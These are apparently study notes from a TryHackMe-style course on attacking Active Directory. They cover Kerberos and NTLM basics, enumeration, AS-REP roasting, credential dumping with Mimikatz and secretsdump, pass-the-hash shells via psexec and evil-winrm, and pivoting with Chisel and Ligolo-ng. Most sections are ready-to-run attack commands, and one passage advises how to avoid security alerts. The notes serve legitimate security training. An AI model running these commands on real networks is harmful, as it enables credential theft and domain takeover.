:## Authentication
#### NTLM
2 versions, NTLMv1 and NTLMv2
Client authenticates to service, service verifies user's identity against domain controller
Client and DC encrypt challenge/nonce using client's password hash
Domain controller compares results, communicates to server
Server grants or denies access accordingly
Simple, no time sync required, fallback compatible, supports non-domain environments
No mutual authentication, weak cryptography, vulnerable to relay and pass-the-hash attacks
Still used in certain scenarios

#### Kerberos
Default authentication protocol in modern AD environments

Several key components:
- Key Distribution Center (KDC): handles ticket requests
- Authentication Service (AS): verifies user's identity, issues TGTs
- Ticket Granting Service (TGS): issues STs to users with valid TGTs
- Ticket Granting Ticket (TGT): initial primary ticket issued after authentication
- Service Ticket (ST): grants access to specific service
- Service Principal Name (SPN): unique identifier for service instance
- KRBTGT Account: account with password hash used to encrypt all TGTs

5-step authentication process:
- Authentication Service Request (AS-REQ)
	- User enters credentials on client machine
	- Client machine sends request to KDC with username and timestamp encrypted with password hash
- Authentication Service Response (AS-REP)
	- KDC decrypts timestamp with stored hash
	- On success, responds with session key encrypted with user's hash and TGT encrypted with KRBTGT's hash
- Ticket Granting Service Request (TGS-REQ)
	- Client sends request to KDC containing TGT, SPN of target service, and username + timestamp encrypted with session key
- Ticket Granting Service Response (TGS-REP)
	- KDC decrypts TGT with KTBTGT hash and validates request
	- Responds with ST encrypted with target service's hash and service session key encrypted with original session key
- Application Request
	- Client sends ST to target service
	- Service decrypts with hash, validates user identity, and grants access

Mutual authentication, no password transmission, single sign-on, delegation support, better performance, time-limited tickets
Time sync required, single point of failure, vulnerable to ticket attacks and Kerberoasting

ccache files on Linux store TGT and service tickets

#### Common Weaknesses
NTLM weaknesses:
- Weak cryptography
- Pass-the-hash
- NTLM relay attacks
- Downgrade attacks
- No mutual authentication

Kerberos weaknesses:
- Kerberoasting
- AS-REP roasting
- Pass-the-ticket
- Overpass-the-hash
- Golden ticket attacks
- Silver ticket attacks

Configuration weaknesses:
- Weak passwords
- Password spraying
- Misconfigured delegation
- Stale credentials

## Breaching
#### AD Attack Surface
- SMB (TCP 445): file shares, printers, remote administration
- LDAP (TCP 389/636): query and manage AD objects
- HTTP/HTTPS
- Kerberos (TCP/UDP 88)
- DNS

#### Techniques
Reconnaissance with Kerbrute
Credential discovery in Git repositories and Jenkins
Password spraying with NetExec

#### Authentication Coercion
LDAP Passback Attack: redirect LDAP connection to attacker-controlled listener
File-Based Coercion: put file on victim device (generally .url file) that calls back to attacker device with hash for NTLM authentication

## Basic Enumeration
#### Network Mapping
Host discovery with fping (ICMP for multiple targets/subnet)
Syntax: `fping [flags] address` (example: `fping -agq 10.211.11.0/24`)
`-a`: show alive systems
`-g`: generate target list from netmask
`-q`: quiet mode
Can also use Nmap in ping scan mode (`nmap -sn [subnet]`)

Port scanning with [[Nmap]]
`nmap -p 88,135,139,389,445 -sV -sC -iL [hosts]`
Version detection, default scripts, read host list from file
Domain controller will often have ports 88 (Kerberos), 389 (LDAP), and 445 (SMB) open
Full port scan: `nmap -sS -p- -T3 -iL hosts.txt -oN full_port_scan.txt`

#### SMB Enumeration
[[Nmap]]
Relevant ports:
- 88 (Kerberos)
- 135 (RPC Endpoint Mapper)
- 139 (NetBIOS Session Service)
- 389 (LDAP)
- 445 (SMB)
- 636 (LDAPS)

smbclient
Command-line interaction with SMB shares
Syntax: `smbclient [options] //[target IP]`
`//[target IP]/[share name]` to connect to specific share
`-L`: list shares
`-N`: no password (attempt anonymous login)
`--user=[username] --password=[password]` or `-U 'username%password'`
`-W`: specify domain for domain account

smbmap
Enumerates SMB shares across host
Can also use `smb-enum-shares` Nmap script
`nmap -p445 --script smb-enum-shares [IP]`

#### User Enumeration
LDAP Enumeration
Lightweight Directory Access Protocol
ldapsearch
`ldapsearch -x -H ldap://[IP] -s base`
`-x`: simple (anonymous) authentication
`-H`: specify LDAP server
`-s`: limit queries to base object, not subtrees or children

Enum4linux-ng
Automates Windows system enumeration
`enum4linux-ng -A [IP] -oA [output file]`
`-A`: perform all available enumeration functions
`-oA`: write output to file

RPC Enumeration
Remote Procedure Call
Null sessions do not require authentication
`rpcclient -U "" [IP] -N`
`-U`: specify username (empty string for anonymous)
`-N`: no password prompt
On success, run `enumdomusers`

RID Cycling
Relative Identifier
If `enumdomusers` is restricted, can manually query user RIDs in range

Kerbrute
After obtaining usernames from earlier method, verify real, active users
If list unavailable, can use known wordlist

#### Password Spraying
Run `rpcclient` (see above), then `getdompwinfo` to view password policy from DC
If anonymous access permitted, `crackmapexec smb [IP] --pass-pol`
`crackmapexec smb [IP] -u users.txt -p passwords.txt`

## Authenticated Enumeration
#### AS-REP Roasting
Dump hashes of user accounts with Kerberos pre-authentication disabled
Step 1: identify vulnerable accounts
Rubeus (Windows only)
Impacket's GetNPUsers.py
`GetNPUsers.py [domain] -dc-ip [IP] -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass`
Step 2: crack hashes
`hashcat -m 18200` for AS-REP hashes

#### Manual Enumeration
`whoami`
`whoami /all` for more details
Useful privileges to look for:
- `SeImpersonatePrivilege`: impersonate another user
- `SeAssignPrimaryTokenPrivilege`: assign other user's token to new process
- `SeBackupPrivilege`: read any file, ignoring file permissions
- `SeRestorePrivilege`: write to any file, ignoring file permissions
- `SeDebugPrivilege`: attach debugger to any process

`hostname`
`systeminfo` (requires admin privileges)
`set` (view environment variables)

`net`: view and manage network resources
`net help`
`net user /domain`: list all users in domain
`net user [username] /domain`: list info for specific user
`net group /domain`: list all domain groups
`net group [group name] /domain`: list machine or user accounts in group
`net localgroup`: list local groups
`net localgroup [group name]`: list members of local group

`quser`: list all users logged on to machine
`tasklist`, `tasklist /V` (requires elevated privileges)
`net session` (requires elevated privileges)
Check `C:\Users\` to find all users that have logged on

`wmic service get`: gather information about services (requires admin privileges)
`sc query state= all`: similar purpose (requires admin privileges)
May want to filter output

Saved auto-logon credentials
`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername`

Installed applications
`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`

Scheduled tasks
`schtasks /query`

#### BloodHound
Major tool for AD enumeration
Enumeration followed by offline planning

SharpHound
Official BloodHound data collector
Enumerates group memberships, session data, access control lists, domain trusts, privileged relationships
`.\SharpHound.exe --CollectionMethods All --Domain tryhackme.loc --ExcludeDCs`

BloodHound.py
Unofficial, widely used for Linux environments
`bloodhound-python -u [username] -p [password] -d [domain] -ns [DNS IP] -c All --zip`

May trigger security alerts, minimize with `--ExcludeDCs`, `DCOnly`, and using systems with antivirus exclusions or non-domain-joined machines

BloodHound runs as web application

#### PowerShell Enumeration
ActiveDirectory module
Available by default on domain controllers
For other machines, install Remote Server Administration Tools for Windows
Check if present with `Get-Module -ListAvailable ActiveDirectory`
If available, `Import-Module ActiveDirectory`
Get all users: `Get-ADUser -Filter *`
Get user details: `Get-ADUser -Identity [username]`
Get user properties: `Get-ADUser -Identity [username] -Properties *`
Get all groups: `Get-ADGroup -Filter *`
Get group members: `Get-ADGroupMember -Identity "[group name]"`
Get all computer accounts: `Get-ADComputer -Filter *`
Get password policy: `Get-ADDefaultDomainPasswordPolicy`

PowerView
Part of PowerSploit framework
Navigate to directory, `Import-Module .\PowerView.ps1`
Get domain users: `Get-DomainUser`
Get domain groups: `Get-DomainGroup`
Get domain computers: `Get-DomainComputer`
Filter with `*[filter]*`
Get domain users with admin privileges: `Get-DomainUser -AdminCount`
Get accounts with non-null SPNs for Kerberoasting: `Get-DomainUser -SPN`

## Credential Harvesting
#### Credential Stores
Local Security Authority Subsystem Service (LSASS): manages authentication, holds credentials in memory
Security Accounts Manager (SAM): stores local password hashes, encrypted with BootKey from SYSTEM hive
LSA secrets: cached domain credentials, cleartext passwords used by scheduled tasks
Data Protection API (DPAPI): built-in cryptographic service, defines master key encrypted by user's Windows password
NTDS.dit: core AD database on domain controller, stores all accounts, NTLM hashes, and Kerberos keys

#### Mimikatz
Powerful post-exploitation tool for Windows systems

DPAPI: `vault::cred /export`

SAM:
Copy SAM and SYSTEM registry hives in PS with:
`reg save HKLM\SAM [file path]`
`reg save HKLM\SYSTEM [file path]`
Mimikatz: `lsadump::sam /sam:"[file path]" /system:"[file path]"`

LSASS:
`privilege::debug`
`sekurlsa::logonpasswords`

LSA secrets:
`privilege::debug`
`token::elevate`
`lsadump::cache`

#### Secretsdump
Python program from Impacket suite
Extracts secrets over SMB
Dump hashes with local admin:
`secretsdump.py [host]/[username]:[password]@[IP] -output [file]`
Most relevant hashes are MS-Cache v2/DCC2 hashes (cached domain logon information)
Can get domain admin's hashes if they've logged in to system before
Hashes can be cracked, but not used for pass-the-hash (not NTLM)
Crack with Hashcat or John the Ripper
`john --format=mscash2 [hash file] --wordlist=[wordlist]`
With domain admin credentials, can run secretsdump.py targeting domain controller
`just-dc` option to only extract NTDS.dit (simulate another DC syncing credentials)
Get shell with `psexec.py '[host]/[username]@[IP]' -hashes :[NT hash]`

## Lateral Movement
Accessing other machines via stolen credentials

#### Remote Execution
Executing commands on remote host using legitimate Windows administration protocols
Requires local admin rights on target host

PsExec
Impacket Python program psexec.py
Connects to target over SMB, uploads service binary, starts Windows service to run binary, and returns interactive shell
Runs as SYSTEM, not as user
Considered noisy
`psexec.py [domain]/[username]:'[password]'@[IP]`

Evil-WinRM
Interacts with WinRM, MS protocol for remote shell access over HTTP/HTTPS
Runs as authenticated user
Account must be part of admin or Remote Managment Users group
Quieter (standard network logon event)
`evil-winrm -i [IP] -u [username] -p [password]`
`-H` option for hash-based authentication (pass-the-hash)

NetExec
Quick, non-interactive command execution
`nxc smb [IP] -u [username] -p [password] -d [domain] -x [cmd.exe command]`
`-X` for Powershell command

#### Credential Reuse
Direct use of NTLM hashes extracted from memory or databases

Pass-the-Hash
Hash spraying across multiple targets with NetExec
`nxc smb [IPs] -u [username] -H [hash] --local-auth`
For targets with admin access, get shell with psexec.py
`psexec.py -hashes [LM:NT] [username]@[IP]`
Can leave LM portion empty if missing: `[:NT]`
Evil-WinRM equivalent:
`evil-winrm -i [IP] -u [username] -H [hash]`

Other techniques:
Pass-the-Ticket: use stolen Kerberos ticket instead of hash
Overpass-the-Hash/Pass-the-Key: use hash to request legitimate Kerberos ticket
Token Impersonation: use SYSTEM access to steal access token of logged-in user

#### Pivoting
Using compromised host as relay for funneling indirect traffic to other hosts

Port Forwarding with SSH
Local (`ssh -L`): opens port on local machine to forward traffic to a specific host and port
`ssh -L [listening port]:[IP]:forwarding port] [user]@[IP] -N`
In second terminal, `xfreerdp /v:[IP]:[port] /u:[username] /p:'[password]' /cert:ignore`
Dynamic (`ssh -D`): sets up SOCKS proxy
`ssh -f -D [port] [user]@[IP] -N`
ProxyChains
`/etc/proxychains.conf` file: `socks4 127.0.0.1 [port]`
`proxychains [nxc command]`
`proxychains [psexec command]`
Only handles TCP traffic (relevant to Nmap)
Uncomment `proxy_dns` in file if using hostnames instead of IPs

Other Tools

Chisel: uses HTTP, works on pivot hosts without SSH
Server: `chisel server --port [port] --reverse`
Client: `chisel.exe client [server IP]:[port] R:[SOCKS port]:socks`

Ligolo-ng: creates virtual TUN network interface
Proxy (attacker): `sudo ./proxy -selfcert`
Agent (compromised): `./agent -connect [proxy IP]:[port] -accept-fingerprint [fingerprint]`
Proxy again:
`sudo ip route add [IP]/[netmask] dev ligolo`
`[nxc command]`
Preferred choice for complex engagements